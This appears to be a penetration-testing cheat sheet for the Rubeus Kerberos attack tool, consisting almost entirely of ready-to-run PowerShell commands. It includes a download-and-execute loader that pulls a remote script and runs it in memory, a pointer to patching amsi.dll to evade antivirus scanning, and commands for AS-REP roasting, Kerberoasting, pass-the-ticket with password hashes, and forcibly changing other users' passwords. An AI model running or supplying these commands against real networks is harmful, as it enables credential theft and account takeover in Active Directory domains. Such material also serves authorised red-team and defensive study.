# References
- [Rubeus](https://github.com/GhostPack/Rubeus)

# Add to PowerShell
> **Warning**
> [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/okazymyrov/piki/master/Invoke-Rubeus.ps1')
```

# Commands

## ASREPRoast with specified credentials
```powershell
Invoke-Rubeus 'asreproast /outfile:asreproast.<domain>.txt /format:hashcat /creduser:<domain>.local\<user> /credpassword:<pass> /dc:<dc> /domain:<domain>'
```

## Kerberoast
### Kerberoast for the current domain
```powershell
Invoke-Rubeus 'kerberoast /outfile:kerberoast.<domain>.txt /format:hashcat'
```

### Kerberoast for a trusted domain
```powershell
Invoke-Rubeus 'kerberoast /outfile:kerberoast.<domain>.txt /format:hashcat /domain:<trusted domain> /dc:<trusted DC>'
```

### Kerberoast from non-joined domain machine
```powershell
Invoke-Rubeus 'kerberoast /outfile:kerberoast.<domain>.txt /format:hashcat /creduser:<domain.local>\<user> /credpassword:<pass> /dc:<dc> /domain:<domain>'
```

### List statistics about found Kerberoastable accounts without actually sending ticket requests
```powershell
Invoke-Rubeus 'kerberoast /stats /creduser:<domain>.local\<user> /credpassword:<pass> /dc:<dc> /domain:<domain>'
```

## Reqest and pass a TGT ticket to the current session
```powershell
Invoke-Rubeus 'asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt'
```

## Change password for another user using kerberos ticket
```powershell
Invoke-Rubeus 'asktgt /user:<user_can_change_passwords> /changepw /rc4:<hash> /domain:<domain> /outfile:<user_can_change_passwords>.ticket'
Invoke-Rubeus 'changepw /ticket:<user_can_change_passwords>.ticket /new:<new_password> /targetuser:<domain.local>\<user_to_change_password> /dc:<dc>.<domain>.local'
```
